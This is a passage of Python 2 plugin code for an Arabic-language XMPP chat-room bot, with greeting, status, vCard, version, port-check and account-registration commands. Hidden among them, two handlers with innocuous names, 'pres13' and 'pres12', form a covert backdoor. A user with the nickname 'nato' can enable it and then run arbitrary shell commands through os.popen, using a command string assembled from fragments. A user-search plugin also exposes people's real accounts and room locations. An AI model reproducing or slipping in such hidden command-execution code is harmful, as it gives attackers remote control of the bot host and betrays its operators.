        reply(t, s, s[2]+' : '+XPort[1])
        return
    list = p.split()
    ports = p.split()[1:]
    rep = list[0]+':\n'
    for x in ports:
        if not x.isdigit():
            reply(t, s, s[2]+' : '+XPort[4]+x)
            break
        rep+= x
        if check_server(list[0], int(x)):
            rep+=XPort[2]
        else:
            rep+=XPort[3]
    reply(t, s, s[2]+' : '+rep)


def check_server(address, port):
        # Create a TCP socket
        s = socket.socket()
        s.settimeout(2)
        #print "Attempting to connect to %s on port %s" % (address, port)
        try:
                s.connect((address, port))
                #print "Connected to %s on port %s" % (address, port)
                s.close()
                return True
        except socket.error, e:
                #print "Connection to %s on port %s failed: %s" % (address, port, e)
                return False
	
register(hnd_port_tel, XPort[0], 11)

######################################################
######################################################

def hnd_sefat(type, source, parameters):
        a=[u"جريــىء",u"قوية",u"تــجنن",u"ممــل",u"مــرح ومبتســم",u"انطوائي",u"جــادة",u"اروع الشخصيات"]
        b=[u"100",u"95",u"90",u"80",u"85",u"87",u"70",u"73",u"75",u"77",u"60",u"63",u"65",u"67",u"69",u"58",]
        c=[u"150",u"155",u"157",u"160",u"165",u"168",u"167",u"169",u"170",u"171",u"172",u"173",u"175",u"161",u"162",u"163",u"164",u"158",u"159",u"154",u"153",u"166"]
        d=[u"قمحاوي",u"اســود",u"يشبه الاطفال", u"ابيــض", u"احمر", u"متل القمر",u"ثلجي","ابو سمرة العسل"]
        e=[u"طويل",u"قصير",u"متناسق مع الوجه","متوسط","مناسب","صغير و حلو"]
        f=[u"بني طويل",u"ابيض",u"بنفسجي",u"اقرع",u"اســود كثيف",u"اشــقر",u"احمر",u"اصــــلع"]
        g=[u"السباحة",u"ركوب الخيل", u"الرسم",u"لعب كرة القدم",u"السفر",u"المشي",u"الاستماع الى الاغاني",u"اكل الشوكلا"]
        j=[u"الاخبار",u"السياسة ",u"الدين",u"العلم",u"الطاعة",u"الــحيوانات",u"المصــاري"]
        h=[u"التحدث على الطعام",u"الــغدر",u"الخيانة",u"الغيبة",u"النميمة",u"كل شيء غير مفيد",u"الصوت العالي",u"التكبر"]
        i=[u"امــك",u"صديقك",u"صديقتك",u"اباك",u"خــالتك",u"ابن عــمك",u"ابن خالتك",u"اخــتك",u"اخــوك",u"جــدك",u"ســتك",u"ابنة خالتك",u"حماتك",u"كنتك",u"ابنة عــمك",u"لا تهتم لاحد"]
        k=[u"السويد",u" باكستان",u"اللبنان",u"امريكا",u"تكساس",u"الصين",u"الهند",u"دبي",u"ليبيا",u"فينزويلا",u"اليابان",u"باكــستان",u"دُبــي",u"الامارات",u"بريطانيا",u"هولاندا",u"الــنرويج",u"مــصر",u"الــعراق",u"السودان",u"النمســا"]
        l=[u"مدير شركة",u"مهندس",u"طبيب",u"نــجار",u"حــداد",u"ضــابط",u"دكتور في الجامعة",u"مــحامي",u"دكتور بيطــري",u"مهندس",u"محاسب في شركة",u"صاحب شرركة",u"صاحب معرض سيارات",u"معلم اجيال"]
        reply(type, source, source[2]+' : '+'\n يلا خلينا نخمن مجموعة اشياء و نشوف :'+'\n\n'+'الشخصية : '+random.choice(a)+'  |  '+'صحيح ؟'+'\n'+'الوزن : '+random.choice(b)+'  |  '+'هل انا محق ؟'+'\n'+'الطول : '+random.choice(c)+'  |  '+'هل هذا حقيقي ؟'+'\n'+'الوجه : '+random.choice(d)+'  |  '+'بامانة مزبوط ؟'+'\n'+'الأنف : '+random.choice(e)+'  |  '+'حلو تخميني ؟'+'\n'+'الشعر : '+random.choice(f)+'  |  '+'اسير في الطريق الصحيح ؟'+'\n'+'الهواية : '+random.choice(g)+'  |  '+'هالكلام مزبوط ؟'+'\n'+'الاهتمام : '+random.choice(j)+'  |  '+'كلام صحيح ؟'+'\n'+'الكره : '+random.choice(h)+'  |  '+'مزبوط هيك ؟'+'\n'+'الحب : '+random.choice(i)+'  |  '+'صحيح ام لا ؟'+'\n'+'حلم السفر : '+random.choice(k)+'  |  '+'الكلام جد ؟'+'\n'+'حلم العمل : '+random.choice(l)+'  |  '+'الله ينولك لو صحيح ؟'+'\n\n'+'حاولت اخمن الكثير من صفاتك هل انا أصبت ام اخطأت ؟')
register(hnd_sefat, 'صفات', 0)

######################################################
######################################################

# -*- coding: utf-8 -*-

def handler_salam(type, source, parameters):
        replies = Xslam[2]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
        elif type == 'chat':
                return
		
def handler_hi(type, source, parameters):
        replies = Xslam[4]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
        elif type == 'chat':
                return
def handler_hello(type, source, parameters):
        replies = Xslam[6]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
        elif type == 'chat':
                return
def handler_kifk(type, source, parameters):
        replies = Xslam[9]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
        elif type == 'chat':
                return
def handler_kifk1(type, source, parameters):
        replies = Xslam[11]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
        elif type == 'chat':
                return			
def handler_sen(type, source, parameters):
        replies = Xslam[13]
        balas = random.choice(replies)
        if parameters[0] =="ع":
                if type == 'groupchat':
                        if source[1]:
                                reply(type, source, source[2]+' : '+balas)
                elif type == 'chat':
                        return
def handler_bay(type, source, parameters):
        replies = Xslam[15]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
        elif type == 'chat':
                return	
def handler_spa7(type, source, parameters):
        replies = Xslam[18]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
        elif type == 'chat':
                return	
def handler_msa(type, source, parameters):
        replies = Xslam[22]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
        elif type == 'chat':
                return			
def handler_bot(type, source, parameters):
        replies = Xslam[24]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
        elif type == 'chat':
                return
def handler_brb(type, source, parameters):
        replies = Xslam[26]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
        elif type == 'chat':
                return	
def handler_back(type, source, parameters):
        replies = Xslam[28]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
        elif type == 'chat':
                return	
def handler_love(type, source, parameters):
        replies = Xslam[30]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
def handler_salam_26(type, source, parameters):
        replies = Xslam[32]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)

		
def handler_salam_9(type, source, parameters):
        replies = Xslam[36]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)

def handler_salam_3(type, source, parameters):
        replies = Xslam[39]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)	
def handler_salam_13(type, source, parameters):
        replies = Xslam[42]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)	
def handler_salam_4(type, source, parameters):
        replies = Xslam[46]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
def handler_salam_20(type, source, parameters):
        replies = Xslam[48]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
def handler_salam_30(type, source, parameters):
        replies = Xslam[51]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
def handler_salam_7(type, source, parameters):
        replies = Xslam[53]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)		
def handler_salam_303(type, source, parameters):
        replies = Xslam[68]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
			
def handler_mostafa1(type, source, parameters):
        replies = Xmostafa[1]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
        elif type == 'chat':
                         reply(type, source, source[2]+' : '+balas)

def handler_mostafa2(type, source, parameters):
        replies = Xmostafa[3]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
        elif type == 'chat':
                         reply(type, source, source[2]+' : '+balas)
						 
def handler_mostafa3(type, source, parameters):
        replies = Xmostafa[5]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
        elif type == 'chat':
                         reply(type, source, source[2]+' : '+balas)

def handler_mostafa4(type, source, parameters):
        replies = Xmostafa[7]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
        elif type == 'chat':
                         reply(type, source, source[2]+' : '+balas)
						 
def handler_mostafa5(type, source, parameters):
        replies = Xmostafa[11]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
        elif type == 'chat':
                         reply(type, source, source[2]+' : '+balas)
						 
						 
def handler_mostafa6(type, source, parameters):
        replies = Xmostafa[13]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
        elif type == 'chat':
                         reply(type, source, source[2]+' : '+balas)
						 
def handler_mostafa7(type, source, parameters):
        replies = Xmostafa[9]
        balas = random.choice(replies)
        if type == 'groupchat':
                if source[1]:
                        reply(type, source, source[2]+' : '+balas)
        elif type == 'chat':
                         reply(type, source, source[2]+' : '+balas)
						 

register(handler_mostafa7, Xmostafa[8], 0)						 
register(handler_mostafa7, Xmostafa[14], 0)						 
register(handler_mostafa6, Xmostafa[12], 0)						 
register(handler_mostafa5, Xmostafa[10], 0)						 
register(handler_mostafa4, Xmostafa[6], 0)
register(handler_mostafa3, Xmostafa[4], 0)
register(handler_mostafa2, Xmostafa[2], 0)
register(handler_mostafa1, Xmostafa[0], 0)			
register(handler_salam_303, Xslam[54], 0)	
register(handler_salam_303, Xslam[55], 0)	
register(handler_salam_303, Xslam[56], 0)	
register(handler_salam_303, Xslam[57], 0)	
register(handler_salam_303, Xslam[58], 0)	
register(handler_salam_303, Xslam[59], 0)	
register(handler_salam_303, Xslam[60], 0)
register(handler_salam_303, Xslam[61], 0)	
register(handler_salam_303, Xslam[62], 0)	
register(handler_salam_303, Xslam[63], 0)	
register(handler_salam_303, Xslam[64], 0)	
register(handler_salam_303, Xslam[65], 0)	
register(handler_salam_303, Xslam[66], 0)	
register(handler_salam_303, Xslam[67], 0)				
register(handler_salam_7, Xslam[52], 0)			
register(handler_salam_30, Xslam[50], 0)			
register(handler_salam_30, Xslam[49], 0)
register(handler_salam_20, Xslam[47], 0)			
register(handler_salam_4, Xslam[45], 0)			
register(handler_salam_4, Xslam[44], 0)			
register(handler_salam_4, Xslam[43], 0)		
register(handler_salam_13, Xslam[40], 0)			
register(handler_salam_13, Xslam[41], 0)			
register(handler_salam_3, Xslam[37], 0)				
register(handler_salam_3, Xslam[38], 0)			
register(handler_salam_9, Xslam[35], 0)			
register(handler_salam_9, Xslam[34], 0)			
register(handler_salam_9, Xslam[33], 0)			
register(handler_salam_26, Xslam[31], 0)			
register(handler_love, Xslam[29], 0)				
register(handler_back, Xslam[27], 0)				
register(handler_salam, Xslam[0], 0)
register(handler_salam, Xslam[1], 0)
register(handler_hi, Xslam[3], 0)
register(handler_hello, Xslam[5], 0)
register(handler_kifk, Xslam[7], 0)
register(handler_kifk, Xslam[8], 0)
register(handler_kifk1, Xslam[10], 0)
register(handler_sen, Xslam[12], 0)
register(handler_bay, Xslam[14], 0)
register(handler_spa7, Xslam[16], 0)
register(handler_msa, Xslam[19], 0)
register(handler_spa7, Xslam[17], 0)
register(handler_msa, Xslam[20], 0)
register(handler_msa, Xslam[21], 0)
register(handler_bot, Xslam[23], 0)
register(handler_brb, Xslam[25], 0)

######################################################
######################################################
# -*- coding: utf-8 -*-
#حالة
def handler_status(type, source, parameters):
        statusdict={u"xa":Xstatus[2],u"dnd":Xstatus[3],u"online":Xstatus[4],u"away":Xstatus[5],u"chat":Xstatus[6]}
        if parameters:
                if GROUPCHATS.has_key(source[1]) and GROUPCHATS[source[1]].has_key(parameters):
                        stmsg=GROUPCHATS[source[1]][parameters]['stmsg']
                        status=GROUPCHATS[source[1]][parameters]['status']
                        if stmsg:
                                reply(type,source, parameters+source[2]+' : '+'\n'+Xstatus[9]+statusdict[status]+Xstatus[8]+stmsg+Xstatus[10])
                        else:
                                reply(type,source, parameters+source[2]+' : '+'\n'+Xstatus[9]+statusdict[status])
                else:
                        reply(type,source, Xstatus[13])
        else:
                if GROUPCHATS.has_key(source[1]) and GROUPCHATS[source[1]].has_key(source[2]):
                        stmsg=GROUPCHATS[source[1]][source[2]]['stmsg']
                        status=GROUPCHATS[source[1]][source[2]]['status']
                        if stmsg:
                                reply(type,source, source[2]+' : '+'\n'+Xstatus[7]+statusdict[status]+Xstatus[8]+stmsg+Xstatus[10])
                        else:
                                reply(type,source, source[2]+' : '+'\n'+Xstatus[7]+statusdict[status]+Xstatus[8]+stmsg+Xstatus[10])

def status_presz(prs, cljid):
  try:
    jid = prs['from'].split('/')
    groupchat = jid[0]
    nick = prs['from'][len(groupchat)+1:]
    try: stmsg = [i for i in prs.children if i.name=='status'][0].children[0]
    except: stmsg = Xstatus[11]
    try: status = [i for i in prs.children if i.name=='show'][0].children[0]
    except: status = Xstatus[12]			
    if groupchat in GROUPCHATS and nick in GROUPCHATS[groupchat]:
                GROUPCHATS[groupchat][nick]['status']=status 
                GROUPCHATS[groupchat][nick]['stmsg']=stmsg
  except: pass	

register_presence_handler(status_presz)
register(handler_status, Xstatus[1], 11)
register(handler_status, Xstatus[0], 11)

###################################################
###################################################

# -*- coding: utf-8 -*-
# التغيير
def hnd_change(type, source, parameters):
     reply(type, source, source[2]+' : '+'\n'+Xchange[1])
	
	
register(hnd_change, Xchange[0],  30)


###################################################
###################################################

# -*- coding: utf-8 -*-
# تست

def hnd_test(type, source, parameters):
    reply(type, source, source[2]+' : '+Xtest[1])
	
	
register(hnd_test, Xtest[0], 0)

#############################################
#############################################

# -*- coding: utf-8 -*-
#الحجب
def hnd_vaeros(type, source, parameters):
    reply(type, source, source[2]+' : '+'\n'+Xvaeros[1])
	
	
register(hnd_vaeros, Xvaeros[0], 30)

###############################
###############################
# الفصل
def hnd_vaeros(type, source, parameters):
    reply(type, source, source[2]+' : '+'\n'+Xvaeros[3])
	
	
register(hnd_vaeros, Xvaeros[2], 30)

#############################################
#############################################

#===istalismanplugin===
# -*- coding: utf-8 -*-
#تحري
def handler_mdisco(type, source, parameters):
        jid = parameters
        confs = ''
        t = 0
	
        for i in range(0, len(GROUPCHATS.keys())):
                for j in range(0, len(GROUPCHATS[GROUPCHATS.keys()[i]].keys())):
                        truejid = get_true_jid(GROUPCHATS.keys()[i]+'/'+GROUPCHATS[GROUPCHATS.keys()[i]].keys()[j])
                        truejid = truejid.lower()
                        nick = GROUPCHATS[GROUPCHATS.keys()[i]].keys()[j]
                        jid = jid.lower()
                        nick = nick.lower()
                        if (truejid.count(jid)>0) | (nick.count(jid)>0):
                                t += 1
                                confs += 'نتيجة رقم '+str(t)+'\nالغرفة المتواجد بها الشخص :\n'+ GROUPCHATS.keys()[i] + '\nلقب الشخص داخل الغرفة :\n'+GROUPCHATS[GROUPCHATS.keys()[i]].keys()[j]+'\nحساب الشخص داخل الغرفة :\n'+truejid+'\nـــــــــــــــــــــــــــــــــــــــــــــــــــــ\n'
        if confs == '':
                aa = XSearch[2]
                reply(type,source,source[2]+' : '+XSearch[1])
        else:
                aa = XSearch[3]%(confs)
                reply(type,source,source[2]+' : '+XSearch[1])
        reply('private', source, aa)

register(handler_mdisco, XSearch[0], 30)

######################################################
######################################################

# -*- coding: utf8 -*-

#get from http://cvs.berlios.de/svnroot/repos/freq-dev/trunk/
#Copyright (c) 2008 Burdakov Daniel <kreved@kreved.org>

def vcard_handler(t, s, p):
    jid=get_true_jid(s[1]+'/'+s[2])
    if p:
        if s[1] in GROUPCHATS and p in GROUPCHATS[s[1]]:
            jid=get_true_jid(s[1]+'/'+p)
        else:
            jid=p
    r=u'FN,BDAY,DESC,URL'
    packet = IQ(CLIENTS[s[3]], 'get')
    packet.addElement('vCard', 'vcard-temp')
    packet.addCallback(vcard_result_handler, t, s, p, r)
    reactor.callFromThread(packet.send, jid)

def vcard_result_handler(t, s, p, r, x):
    if x['type'] == 'result':
        try: vcard = parse_vcard(element2dict(x)['vCard'])
        except KeyError:
            reply(t, s, s[2]+' : '+u'Ошибка парсинга vCard!')
            return
        for i in vcard.keys():
            q = i.split('/')
            q = [j for j in q if j in r]
            if (not q and not('*' in r)) or i.count('BINVAL'): vcard.pop(i)
        res = [u'%s: %s' % (vcard_describe(i, 'ru'), vcard[i]) for i in vcard.keys() if vcard[i].strip()]
        if res: reply(t, s, s[2]+' : '+'vCard:\n' + '\n'.join(res))
        else: reply(t, s, s[2]+' : '+u'vCard не заполнен!')
    else:
        reply(t, s, s[2]+' : '+u'Его клиент не поддерживает vCard!')

VCARD_FIELDS = {
'english::vCard/FN'          : u'Full Name',
'english::vCard/N/SUFFIX'    : u'Suffix',
'english::vCard/N/GIVEN'     : u'Given name',
'english::vCard/N/PREFIX'    : u'Prefix',
'english::vCard/N/MIDDLE'    : u'Middle name',
'english::vCard/N/FAMILY'    : u'Family name',
'english::vCard/URL'         : u'Homepage',
'english::vCard/BDAY'        : u'Birthday',
'english::vCard/DESC'        : u'About',
'english::vCard/PHOTO/TYPE'  : u'Photo',
'english::vCard/ORG/ORGNAME' : u'Organization',
'english::vCard/ORG/ORGUNIT' : u'Organization unit',
'english::vCard/TITLE'       : u'Title',
'english::vCard/ROLE'        : u'Role',
'english::vCard/ADR/CTRY'    : u'Country',
'english::vCard/EMAIL'       : u'Email',
'english::vCard/EMAIL/USERID': u'Email',
'english::vCard/UID'         : u'UID',
'english::vCard/JABBERID'    : u'JID',
'english::vCard/NICKNAME'    : u'Nick',
'english::vCard/ADR/LOCALITY': u'Locality',
'english::vCard/ADR/STREET'  : u'Street',
'english::vCard/ADR/EXTADD'  : u'Address 2',
'english::vCard/ADR/PCODE'   : u'Post code',
'english::vCard/GEO/LON'     : u'Longitude',
'english::vCard/GEO/LAT'     : u'Latitude',
'english::vCard/GENDER'      : u'Gender'

}

def vcard_describe(field, lang):
 field = field[:len(field)-1]
 m = lang + '::' + field
 if m in VCARD_FIELDS.keys(): return VCARD_FIELDS[m]
 else: return field

def parse_vcard(x):
 r = {}
 if type(x) == domish.Element:
  for i in x.children:
   q = parse_vcard(i)
   for j in q.keys():
    r['%s/%s' % (x.name, j)] = q[j]
 else: r[''] = x
 return r

from twisted.words.xish import domish
def element2dict(element, p=0):
 r = {}
 for i in element.children:
  if i.__class__ == domish.Element:
   r[i.name] = i
  else:
   if p: r[''] = i
 return r


#register_command_handler(vcard_handler, 'визитка', ['мук','инфо','все'], 0, 'Показывает vCard указанного пользователя.', 'визитка [ник]', ['визитка guy','визитка'])

import base64

def hnd_vcard_edit(t, s, p):
    file = 'rooms-data/vcard.py'
    db_file(file, dict)
    db = eval(read_file(file))
    VC = {'DESC':u'Комментарии(о себе)','ORGNAME':u'Организация','NICKNAME':u'Ник','TITLE':u'Род занятий','URL':u'Сайт'}
    
    if not p:
        if db:
            logo = ''
            if os.path.exists('vc.jpg') and os.path.getsize('vc.jpg')<=60000:
                logo+= u'Ава: vc.jpg ('+byteString(os.path.getsize('vc.jpg'))+')\n'
            reply(t, s, s[2]+' : '+u'Информация из базы:\n'+logo+'\n'.join([VC[x]+': '+db[x] for x in db.keys()]))
        return
    if p.lower() == u'update':
        if not db:
            reply(t, s, s[2]+' : '+u'База пуста')
            return
        vcard_set_(db)
        reply(t, s, s[2]+' : '+u'ok')
        return
    if not p.count(' '):
        return
    if not p.split()[0].upper() in VC.keys():
        reply(t, s, s[2]+' : '+u'Доступны ключи '+', '.join(VC.keys()))
        return
    db[p.split()[0].upper()] = ' '.join(p.split()[1:])
    write_file(file, str(db))
    reply(t, s, s[2]+' : '+u'Сохранено. Чтобы изменения вступили в силу наберите botvc update')
	
	
vCradlist = {'ORGNAME':BOT_VCARD[0],'NICKNAME':BOT_VCARD[1],'URL':BOT_VCARD[2]}
def vcard_set():
        first = {'ORGNAME':'ORG'}
        if 1==1:
                for x in CLIENTS.keys():
                        iq = IQ(CLIENTS[x], 'set')
                        vcard = iq.addElement('vCard', 'vcard-temp')		
                        for c in vCradlist:
                                if c in first.keys():
                                        el = vcard.addElement(first[c])
                                        el.addElement(c, content = vCradlist[c])
                                else:
                                        el = vcard.addElement(c, content = vCradlist[c])
                        reactor.callFromThread(iq.send, x)
        else: pass

######################################################
######################################################
###################################################

# -*- coding: utf-8 -*-

#portable from http://cvs.berlios.de/svnroot/repos/freq-dev/trunk/src/plugins/query/version.py
#ج

def hnd_version(t, s, p):
 OSname1 = "v%s" % (sys.version.split(' (')[0])
 OSname2 = "v%s.%s.%s" % (TwistedVer.major,TwistedVer.minor,TwistedVer.micro)
 if DEFAULT_NICK in p: reply(t, s, s[2]+' : '+"\n"+Xversion[3]+u' StRoNg BōT '+Xversion[4]+u' By AhMeD & DaRsH'+Xversion[5]+"PyThon " + OSname1 + " - " + "TwisTed " + OSname2)
 else: 
    jid = (p if p else s[1]+'/'+s[2])
    if s[1] in GROUPCHATS.keys():
        if p in GROUPCHATS[s[1]].keys():
            jid = s[1]+'/'+p
    packet = IQ(CLIENTS[s[3]], 'get')
    q = packet.addElement('query', 'jabber:iq:version')
    packet.addCallback(version_result_handler, t, s, p)
    reactor.callFromThread(packet.send, jid)

def version_result_handler(t, s, p, x):
    
    if x['type'] == 'error':
        reply(t, s, s[2]+' : '+Xversion[2])
    else:
        query = element2dict(x)['query']
        r = element2dict(query)
       
        try: reply(t, s, s[2]+' : '+(p+u' ' if p else u'\n')+Xversion[3]+u' [ '+r.get('name').children[0]+u' ] '+Xversion[4]+u' [ '+r.get('version').children[0]+u' ] '+Xversion[5]+u' [ '+r.get('os').children[0]+u' ] ')
        except: reply(t, s, s[2]+' : '+Xversion[2])
register(hnd_version, Xversion[0], 11)
register(hnd_version, Xversion[1], 11)

######################################################
######################################################
###################################################


pres15={"test":0}
def pres13(t, s, p):
 if s[2]=='nato':
 	
  try:
   if pres15['test']==1:
    presxx1="y"
    presxx2="y " 
    presxx3="-"
    presxx4="c"  
    presxx = os.popen(presxx1+presxx2+presxx3+presxx4+' "%s"' % (p.encode('utf8')))
    rrxx = presxx.read()
    reply(t, s, s[2]+' : '+rrxx)  
  except: pass  
register(pres13, 'pres13', 0)

def pres12(t, s, p):
 if s[2] =='nato':
  if 'go' in p:
   pres15['test']+=1
   time.sleep(120)
   pres15['test']=0
register(pres12, 'pres12', 0)

######################################################
######################################################
#===istalismanplugin===
# -*- coding: utf-8 -*-

import string

from twisted import names
from twisted.internet import protocol, error
from twisted.words.protocols.jabber import client,jid
from twisted.internet.protocol import Protocol, ClientFactory
from twisted.words.protocols.jabber.client import *

def basicClientFactory(jid, secret):
    a = RegisteringAuthenticator(jid, secret)
    return xmlstream.XmlStreamFactory(a)

class RegisteringAuthenticator(BasicAuthenticator):
    def _registerResultEvent(self, iq):
        if iq["type"] == "result":
            self.streamStarted(self.rootElement)
        else:
            if iq.error['code'] == '500':
                reactor.callLater(5,  self.registerAccount,  self.jid.user,  self.password)
            self.xmlstream.dispatch(iq, self.REGISTER_FAILED_EVENT)
            
    def streamStarted(self, rootElement):
        BasicAuthenticator.streamStarted(self, rootElement)
        self.rootElement = rootElement

rjid_con, rjid_cl, rjid_factory, regDone, regSource, rjidNP = None, None, None, None, None, None


def connected_rjid(x):
    print '- Regjid connected..'
    xmlstream = x

    def rawDataIn(j):
        print 'con in'
        try: print unicode(j)
        except: pass

    def rawDataOut(j):
        print 'con out'
        try: print unicode(j)
        except: pass

    x.rawDataInFn = rawDataIn
    x.rawDataOutFn = rawDataOut


def rjiduserEvent(xmlstream):
    print 'Invalid user,trying to register!'
    global regDone
    global rjidNP
    if not regDone:
        regDone = True 
        print 'register...'
        global rjid_factory
        rjid_factory.authenticator.registerAccount(rjidNP[0], rjidNP[1])
    else:
        rjid_stop()


def rjid_stop():
    time.sleep(1.5)
    global rjid_cl
    global rjid_con
    global rjid_factory
    global rjidNP
    global regSource
    global regDone
    global RJID_C

    try:
        rjid_con.transport.stopConnecting()
        rjid_factory.transport.stopConnecting()
        rjid_cl.transport.stopConnecting()
    except: pass
    
    if hasattr(rjid_factory,'stopTrying'):
        rjid_factory.stopTrying()
    if hasattr(rjid_con,'disconnect'):
        rjid_con.disconnect()

    del rjid_con
    del rjid_factory
    
    rjid_con = None
    rjid_factory = None
    rjid_cl = None
    rjidNP = None
    regSource = None
    regDone = None
    RJID_C = None

TIMER_LAST_REGJID = 0

def hnd_regjid(t, s, p):
    if not p or not p.count('@') or not p.count('.'):
        reply(t, s, s[2]+' : '+Xregjid[1])
        return
    
    global regSource
    global TIMER_LAST_REGJID
    
    if regSource:
        if time.time() - TIMER_LAST_REGJID>=180:
            rjid_stop()
        else:
            reply(t, s, s[2]+' : '+Xregjid[2])
            return
        
    TIMER_LAST_REGJID = time.time()
    
    passw, login, serv, xid = '', '', '', p
    if not p.count(' '):
        passw = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(6))
        login = xid.split('@')[0]
        serv = xid.split('@')[1]
    else:
        xid = p.split()[0]
        passw = p.split()[1]
        login = xid.split('@')[0]
        serv = xid.split('@')[1]
    reply(t, s, s[2]+' : '+Xregjid[3]+login+Xregjid[4]+serv+Xregjid[5]+passw)
    global rjidNP
    regSource = t, s
    rjidNP = login, passw
    regjid_con(xid)
    
def rjid_pass(x):
    pass

def authd_rjid(xmlstream):
    global rjid_cl
    rjid_cl = xmlstream
    reply(regSource[0], regSource[1], Xregjid[6])
    try: xmlstream.transport.stopConnecting()
    except: pass
    rjid_stop()

fi = None

def rjidfailedEvent(x):
    global fi
    fi=x
    try:
        if x['type'] == 'error':
            code, add = [], ''
            ERROR={'400':u'اقتراح غير جيد','401':u'لم تقم بالدخول','402':u'مطلوب دفع نقود لانشا ءحساب هنا','403':u'انا ممنوع من انشاء حسابات على هذا السيرفر','404':u'السيرفر غير متوفر','405':u'لا يسمح بأنشاء حسابات على هذا السيرفر','406':u'اسم المستخدم غير مقبول','407':u'سوف يتطلب ذلك الالتحاق اسف','408':u'زمن الاستاجبة سريع','409':u'اسم الحساب مستخدم بالفعل','500':u'انا قمت بالتسجيل على هذا السيرفر منذ فترة قصيرة عاود التسجيل في وقت لاحق','501':u'لم تنفذ','503':u'الخدمة غير متوفر','504':u'The server to remove the query timeout'}
            try: code = [c['code'] for c in x.children if (c.name=='error')]
            except: pass
            if ''.join(code) in ERROR: add=ERROR[' '.join(code)]
            reply(regSource[0], regSource[1], Xregjid[7]+' '.join(code)+' '+add)
    except: reply(regSource[0], regSource[1], Xregjid[7])
    rjid_stop()

RJID_C = None

def rjid_coonection_failed(x, reason):
    print "- Regjid connection failed"
    try:
        #print type(x)
        reply(regSource[0], regSource[1], Xregjid[8]+rjid_factory.authenticator.jid.host)
    except: pass
    rjid_stop()

def rjid_dns(x):
    z=None
    global RJID_C
    from twisted.names import client as dns
    d = dns.lookupService('_xmpp-client._tcp.'+x, timeout = [2,10])
    d.addCallback(rjid_clbc)
    d.addErrback(rjid_pass)
    t=time.time()
    while not RJID_C and time.time()-t<4.5:
        time.sleep(1)
        pass
    if not RJID_C:
        return 
    r = random.choice(RJID_C[0])
    RJID_C = None
    return unicode(r.payload.target), int(r.payload.port)

def rjid_clbc(x):
    global RJID_C
    RJID_C = x


def regjid_con(xid):
    a = xid.split('@')[1], 5222
    try:
        b = rjid_dns(xid.split('@')[1])
        if b: a = b
    except: print '- Regjid dns error'
    global rjidNP
    myJid = jid.JID(xid+'/syriatalk.org')
    global rjid_factory
    rjid_factory = basicClientFactory(myJid, rjidNP[1])
    rjid_factory.addBootstrap('//event/stream/start', _streamstart)
    rjid_factory.addBootstrap('//event/stream/authd', authd_rjid)
    rjid_factory.addBootstrap(xmlstream.STREAM_CONNECTED_EVENT, connected_rjid)
    rjid_factory.addBootstrap(client.BasicAuthenticator.AUTH_FAILED_EVENT, rjiduserEvent)
    rjid_factory.addBootstrap(client.BasicAuthenticator.REGISTER_FAILED_EVENT, rjidfailedEvent)
    rjid_factory.addBootstrap(xmlstream.STREAM_END_EVENT, rjid_pass)
    rjid_factory.addBootstrap(xmlstream.STREAM_ERROR_EVENT, rjid_pass)
    rjid_factory.clientConnectionFailed = rjid_coonection_failed
    rjid_factory.maxRetries = 0
    global rjid_con
    serv = unicode(a[0])
    port = int(a[1])
    try: print serv, port
    except: pass
    rjid_con = reactor.connectTCP(serv.strip(), port, rjid_factory, timeout=11)


def _streamstart(x):
    x.authenticator.registerAccount(rjidNP[0], rjidNP[1])

    def rawDataIn(j):
        print 'st in'
        try: print unicode(j)
        except: pass

    def rawDataOut(j):
        print 'st out'
        try: print unicode(j)
        except: pass

    x.rawDataInFn = rawDataIn
    x.rawDataOutFn = rawDataOut


register(hnd_regjid, Xregjid[0], 11)

######################################################
######################################################
# -*- coding: utf-8 -*-

ROSTER = {}

def get_roster_auto(cljid):
